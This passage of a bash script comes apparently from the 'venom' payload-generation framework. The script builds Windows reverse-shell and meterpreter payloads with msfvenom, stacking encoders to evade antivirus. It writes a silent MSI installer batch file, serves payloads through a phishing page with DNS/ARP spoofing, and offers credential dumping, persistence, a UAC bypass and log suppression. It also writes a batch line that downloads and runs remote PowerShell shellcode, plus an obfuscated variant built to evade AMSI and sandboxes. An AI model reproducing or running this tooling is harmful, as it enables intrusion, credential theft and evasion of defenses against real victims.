if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: G0tmi1k" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="G0tmi1k";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
fi

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc4 ]; then
      echo "[☠] exec.rb -> found!"
      sleep 2
   else
      echo "[☠] exec.rb -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc4 $IPATH/templates/exec[bak].rb
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc4 > /dev/null 2>&1
   else
      gedit $InJEc4 > /dev/null 2>&1
   fi


     cd $IPATH/templates
     mv $InJEc4 $IPATH/output/$N4m.rb


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.rb\n\nchose how to deliver: $N4m.rb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.rb|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.rb $ApAcHe/$N4m.rb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.rb $ApAcHe/$N4m.rb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.rb > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}






# -------------------------------------------
# build shellcode in MSI (windows-platforms)
# and build installer.bat to use in winrar/sfx
# to be executable by pressing on it :D
# -------------------------------------------
sh_shellcode8 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: msiexec" --entry --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="msiexec";fi

echo "[☠] Building shellcode -> msi format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : MSI -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
# xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m.msi"
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f msi-nouac > $IPATH/output/$N4m.msi" > /dev/null 2>&1
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi" > /dev/null 2>&1
fi


echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
echo "[☠] Injecting shellcode -> $N4m.msi!"
sleep 2
# build winrar/SFX installer.bat script
echo "[☠] Building winrar/SFX -> installer.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
echo ":: this script will run payload using msiexec" >> $IPATH/output/installer.bat
echo ":: ---" >> $IPATH/output/installer.bat
echo "@echo off" >> $IPATH/output/installer.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
echo "msiexec /quiet /qn /i $N4m.msi" >> $IPATH/output/installer.bat
echo "exit" >> $IPATH/output/installer.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.msi\n$IPATH/output/installer.bat\n\nExecute on cmd: msiexec /quiet /qn /i $N4m.msi\n\nchose how to deliver: $N4m.msi" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.msi needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start installer.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    cp persistence2.rc persistence2[bak].rc
    sed -i "s|N4m|$N4m.msi|g" persistence2.rc
    sed -i "s|IPATH|$IPATH|g" persistence2.rc
    sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m2|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m2|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# --------------------------------------------------------------
# build shellcode powershell <DownloadString> + Invoke-Shellcode
# Matthew Graeber - powershell technics (Invoke-Shellcode)
# --------------------------------------------------------------
sh_shellcode9 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
zenity --title="☠ WARNING: ☠" --text "'Invoke-Shellcode' technic only works\nagaints 32 byte systems (windows)" --info --width 300 > /dev/null 2>&1
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Graeber" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Graeber";fi

echo "[☠] Building shellcode -> powershell format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw

cd $IPATH/aux
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo" > /dev/null 2>&1
rm *.ps1 > /dev/null 2>&1
rm *.vbs > /dev/null 2>&1

# display shellcode
mv *.bat $IPATH/bin/sedding.raw
disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'} | tr -d '\n'`
echo "$disp" > $IPATH/output/chars.raw
echo ""
echo "[☠] shellcode -> powershell encoded!"
sleep 2
echo $disp
echo "" && echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc8 $IPATH/templates/InvokePS1[bak].bat
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


   # check if template exists
   if [ -e $InJEc8 ]; then
      echo "[☠] InvokePS1.bat -> found!"
      sleep 2
   else
      echo "[☠] InvokePS1.bat -> not found!"
      exit
   fi


# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2


OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&cmd.exe /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp" > $N4m.bat
else
echo "[✔] String obfuscation technic sellected .."
### TODO: check if connects back..
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
#
# STRING: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp
echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//bit.ly/14bZZ0'+'c');In^vo%Id%k%Count+8%e-S%$'''d%hel^l%,,;F%cod^e -For%en%ce -Sh%IN%e^ll%oOp%cod^e $disp" > $N4m.bat
fi


#sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
mv $N4m.bat $IPATH/output/$N4m.bat
sleep 2



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
